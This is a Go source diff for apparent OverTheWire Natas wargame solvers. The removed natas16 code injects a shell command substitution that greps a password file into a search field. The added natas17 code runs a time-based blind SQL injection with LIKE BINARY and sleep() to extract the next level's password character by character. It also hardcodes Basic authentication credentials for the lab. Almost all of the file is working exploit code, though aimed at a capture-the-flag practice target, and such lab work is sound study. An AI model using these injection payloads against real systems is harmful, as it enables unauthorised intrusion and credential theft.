@@ -2,62 +2,46 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
-	"log"
 	"net/http"
 	"net/url"
-	"regexp"
 	"strings"
-
-	"github.com/PuerkitoBio/goquery"
-)
-
-const (
-	formurl    = "http://natas16.natas.labs.overthewire.org/"
-	characters = "eEqQJjhHBboOlLfFnNvVwW9sS87kK0tT5cC"
+	"time"
 )
 
 func main() {
-	formData := url.Values{}
-	password := ""
-	reg := regexp.MustCompile("zigzag")
+	fmt.Println("Start")
+	client := &http.Client{}
+
+	formdata := url.Values{}
+	formdata.Set("submit", "Check existence")
+
+	formurl := "http://natas17.natas.labs.overthewire.org/"
+	check := "bBCdDgGjJKlLOpPRVxyZ146"
+	password := "6OG1P"
+
 	for len(password) < 32 {
-		for _, a := range characters {
-			payload := `$(grep ` + password + string(a) + ` /etc/natas_webpass/natas17)zigzag`
-			formData.Set("needle", payload)
-			formData.Set("submit", "Search")
+	for _,ch := range check {
+		payload := `natas18" and password LIKE BINARY '` + password + string(ch) + `%' and sleep(10) -- `
+		formdata.Set("username", payload)
+		req,_ := http.NewRequest("POST", formurl, strings.NewReader(formdata.Encode()))
 
-			req, err := http.NewRequest("POST", formurl, strings.NewReader(formData.Encode()))
-			if err != nil {
-				log.Fatalf("Failed to create req")
-			}
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.Header.Set("Authorization", "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==")
 
-			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-			req.Header.Set("Authorization", "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==")
+		start := time.Now()
 
-			client := &http.Client{}
+		resp,err := client.Do(req)
+		if err!= nil {
+			fmt.Println(err)
+		}
+		defer resp.Body.Close() 
+		elapsed := time.Since(start).Seconds()
 
-			resp, err := client.Do(req)
-			if err != nil {
-				log.Fatalf("Failed to send req")
-			}
-			defer resp.Body.Close()
-
-			responseBody, err := ioutil.ReadAll(resp.Body)
-			if err != nil {
-				log.Fatalf("Failed to read resp")
-			}
-			doc, err := goquery.NewDocumentFromReader(strings.NewReader(string(responseBody)))
-			if err != nil {
-				log.Fatalf("Failed to parse html")
-			}
-			doc.Find("pre").Each(func(i int, s *goquery.Selection) {
-				if !reg.MatchString(s.Text()) {
-					password += string(a)
-				fmt.Printf("%s\n",password)
-				}
-			})
+		if elapsed > 5 {
+			password += string(ch)
+			fmt.Println(password)
+			break
 		}
 	}
 }
-
+}
